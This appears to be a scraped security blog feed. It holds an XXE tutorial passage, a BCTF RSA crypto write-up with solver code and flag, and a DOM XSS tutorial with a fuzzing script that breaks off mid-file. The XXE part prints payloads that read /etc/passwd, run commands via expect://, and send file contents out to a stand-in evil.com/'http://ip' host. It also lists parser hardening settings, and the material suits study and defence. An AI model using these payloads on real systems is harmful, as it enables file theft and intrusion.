class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://evil.com/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">evil.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://zone.wooyun.org/content/26651" target="_blank" rel="noopener">ftpxxe</a><br></p><table><thead><tr><th>libxml2</th><th>php</th><th>java</th><th>.net</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td><td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td><td>http<br>file<br>https<br>ftp</td></tr></tbody></table><p>php</p><table><thead><tr><th>scheme</th><th>extension required</th></tr></thead><tbody><tr><td>https<br>ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h6 id="demo1-"><a href="#demo1-" class="headerlink" title="demo1 "></a>demo1 </h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><h6 id="demo2-"><a href="#demo2-" class="headerlink" title="demo2 "></a>demo2 </h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">DTD</span><br><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;"</span>&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h6 id="demo3-"><a href="#demo3-" class="headerlink" title="demo3 "></a>demo3 </h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "expect://id"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>phpexpect</p><h6 id="demo4-"><a href="#demo4-" class="headerlink" title="demo4 "></a>demo4 </h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "http://192.168.1.20:80"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>ipwarning failed to open stream<br></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h6 id=""><a href="#" class="headerlink" title=""></a></h6><ol><li>PHP<br>libxml_disable_entity_loader(true);</li><li>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</li><li>Python<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</li></ol><h6 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h6><p>&lt;!DOCTYPE&lt;!ENTITYSYSTEMPUBLIC</p><h3 id="jsonContent-Type-XXE"><a href="#jsonContent-Type-XXE" class="headerlink" title="jsonContent-Type XXE"></a>jsonContent-Type XXE</h3><p>webjsonhttp request<code>Content-Type: application/json</code>jsonxmlxmlxxe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p><code>Content-Type</code>xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>xmlxxe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure></p><p>jsonxml415</p><h5 id="xxe-cheat-sheetDTD-Attacks"><a href="#xxe-cheat-sheetDTD-Attacks" class="headerlink" title="xxe-cheat-sheetDTD-Attacks"></a><a href="http://web-in-security.blogspot.hk/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">xxe-cheat-sheet</a><a href="https://github.com/RUB-NDS/DTD-Attacks" target="_blank" rel="noopener">DTD-Attacks</a></h5><h2 id="security-tencent-com91ri-org"><a href="#security-tencent-com91ri-org" class="headerlink" title="security.tencent.com91ri.org"></a><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a><a href="https://www.91ri.org/12814.html" target="_blank" rel="noopener">91ri.org</a></h2>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFBCTF Crypto SpecialRSA writeup</title>
      <link href="2016/03/20/old-old-CTF-BCTF-Crypto-SpecialRSA-writeup/"/>
      <url>2016/03/20/old-old-CTF-BCTF-Crypto-SpecialRSA-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="http://blog.0kami.cn/images/bctf/specialRSA.jpg" alt=""><br><a id="more"></a><br><a href="http://blog.0kami.cn/static/special_rsa.zip" title="zip">zip</a></p><ul><li></li><li></li><li></li><li>flag<br>kkflag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext</span><br><span class="line">   encode c=[(k^r%N)*m]%N</span><br><span class="line">   decode m=[(d^r%N)*c]%N</span><br><span class="line">   2(m,r,c) N </span><br><span class="line">   k</span><br></pre></td></tr></table></figure></li></ul><p>k<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">^-1</span><br><span class="line">   gcd(r1,r2)=1,a,br1*a+r2*b=1</span><br><span class="line">      k^1</span><br><span class="line">         =k^(r1*a+r2*b)</span><br><span class="line">         =k^(r1*a) * k^(r2*b)</span><br><span class="line">         =(k^r1)^a * (k^r2)^b</span><br><span class="line">k^rn (m,r,c)</span><br><span class="line">encodec=[(k^r%N)*m]%N</span><br><span class="line">k^r=c*(m^-1)</span><br><span class="line">m</span><br></pre></td></tr></table></figure></p><p>python(m,r,c),k<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import msgpack</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">N = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131L</span><br><span class="line"></span><br><span class="line">def Ext_Euclid (a , b ):</span><br><span class="line">        <span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">          a*x + b*y = gcd(a,b)   x,yabgcd</span></span><br><span class="line"><span class="string">        :param a:</span></span><br><span class="line"><span class="string">        :param b:</span></span><br><span class="line"><span class="string">        :return:x,yabgcd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        '</span><span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> (b == 0):</span><br><span class="line">            <span class="built_in">return</span> 1 , 0 , a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x , y , q=Ext_Euclid( b , a % b )</span><br><span class="line">            x , y = y,( x - (a // b) * y )</span><br><span class="line">            <span class="built_in">return</span> x , y , q</span><br><span class="line">m1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360L</span><br><span class="line"></span><br><span class="line">c1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886L</span><br><span class="line"></span><br><span class="line">m11=RSA.inverse(m1,N)<span class="comment"># </span></span><br><span class="line">kr1=m11*c1</span><br><span class="line"></span><br><span class="line">m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258L</span><br><span class="line"></span><br><span class="line">c2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597L</span><br><span class="line"></span><br><span class="line">m21=RSA.inverse(m2,N)</span><br><span class="line">kr2=m21*c2</span><br><span class="line"><span class="comment"># print kr2</span></span><br><span class="line"></span><br><span class="line">r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443L</span><br><span class="line"></span><br><span class="line">r2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059L</span><br><span class="line"></span><br><span class="line">a,b,_=Ext_Euclid(r1,r2)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="built_in">print</span> b</span><br><span class="line"><span class="comment"># print a*r1+b*r2</span></span><br><span class="line"></span><br><span class="line">x1=RSA.inverse(kr2,N)</span><br><span class="line">k=(pow(kr1, a,N)*pow(x1,-b,N))%N</span><br><span class="line"><span class="built_in">print</span> k</span><br></pre></td></tr></table></figure></p><p></p><p><code>k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L</code></p><p>kflag.<code>BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}</code><br>pow</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&gt;0,b&lt;0</span><br><span class="line">(k^r)^b</span><br><span class="line">=(k^-r)^-b</span><br><span class="line">k^r mod N</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>:)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VULNERABLITYDOM XSS</title>
      <link href="2016/03/17/old-old-DOM-XSS/"/>
      <url>2016/03/17/old-old-DOM-XSS/</url>
      
        <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><em>Web</em> DOMXSS<br>DOMXSSXSSDOMXSSDOMXSS<strong>0x04</strong><br><a id="more"></a></p><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>HTMLJavascript<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;</span><br><span class="line">2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function HtmlEncode(str) &#123;</span><br><span class="line">var s=&quot;&quot;;</span><br><span class="line">if(str.length==0) return &quot;&quot;;</span><br><span class="line">s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;);</span><br><span class="line">s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;);</span><br><span class="line">s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;);</span><br><span class="line">s=str.replace(/\&quot;/g, &quot;&amp;quot;&quot;);</span><br><span class="line">return s;</span><br><span class="line">&#125;</span><br><span class="line">3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt;</span><br></pre></td></tr></table></figure></p><p><code>&lt;img src=@ onerror=alert(123) /&gt;</code>DOM<code>alert(123)</code><code>document.write</code><code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>HTML,Javascript2<br>HTMLJavascriptHTMLjavascriptHTMLHTMLjavascriptHTML<code>&amp;lt;img src=@ onerror=alert(123) /&amp;gt;</code>javascript<code>&lt;img src=@ onerror=alert(123) /&gt;</code>javascriptHTMLDOM<br>HTML</p><ul><li>&#xH;()&#D;(),</li><li>HTMLHtmlEncode</li></ul><p>javascriptjavascript<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function $(id)&#123;return document.getElementById(id);&#125;;</span><br><span class="line">$(&apos;exec_btn&apos;).onclick=function()&#123;</span><br><span class="line">document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;);</span><br><span class="line">document.write(&apos;\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0040\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0032\u0033\u0029\u0020\u002f\u003e&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2writejavascriptjavascriptjavascript<br>JavaScript</p><ul><li>Unicode\uH</li><li>\xH</li><li>\\\&lt;>\</li></ul><p>HTMLJavascript<br>HtmlEncode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;iframe&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;noscript&gt;&lt;/noscript&gt;</span><br><span class="line">&lt;noframes&gt;&lt;/noframes&gt;</span><br><span class="line">&lt;textarea&gt;&lt;/textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;xmp&gt;&lt;/xmp&gt;</span><br><span class="line">&lt;plaintext&gt;&lt;/plaintext&gt;</span><br></pre></td></tr></table></figure></p><p><code>&lt;xmp&gt;</code>HtmlEncode<code>&lt;plaintext&gt;</code>FirefoxHtmlEncodechrome</p><h3 id="DOM-fuzzing"><a href="#DOM-fuzzing" class="headerlink" title="DOM fuzzing"></a>DOM fuzzing</h3><p>  python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def get_template(template_file):</span><br><span class="line">    &quot;&quot;&quot;fuzzing&quot;&quot;&quot;</span><br><span class="line">    content=&apos;&apos;</span><br><span class="line">    with open(template_file) as f:</span><br><span class="line">        content=f.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">def set_result(result_file,result):</span><br><span class="line">    &quot;&quot;&quot;fuzzing&quot;&quot;&quot;</span><br><span class="line">    with open(result_file,&apos;w&apos;) as f:</span><br><span class="line">        f.write(result)</span><br><span class="line">def fuzzing(fuzz_file,result_file):</span><br><span class="line">    template=get_template(fuzz_file)</span><br><span class="line">    fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;)</span><br><span class="line">    fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip()</span><br><span class="line">    # chars=[]</span><br><span class="line">    chars=[]</span><br><span class="line">    for i in xrange(255): # ASCII</span><br><span class="line">        if i!=62:</span><br><span class="line">            chars.append(chr(i))</span><br><span class="line"></span><br><span class="line">    fuzz_area_result=&apos;&apos;</span><br><span class="line">    for c in chars: # fuzzing</span><br><span class="line">        fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c)</span><br><span class="line">        fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c)))</span><br><span class="line">        fuzz_area_result+=fuzz_area_r+&apos;\n&apos;</span><br><span class="line">        print fuzz_area_r</span><br><span class="line">    result=template.replace(fuzz_area,fuzz_area_result)</span><br><span class="line">    set_result(result_file,result)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;)</span><br></pre></td></tr></table></figure></p><p>fuzz_xss_0.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Fuzz xss 0&lt;/title&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function $(x)&#123;return document.getElementById(x);&#125;</span><br><span class="line">        function f(id)&#123;</span><br><span class="line">            $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">  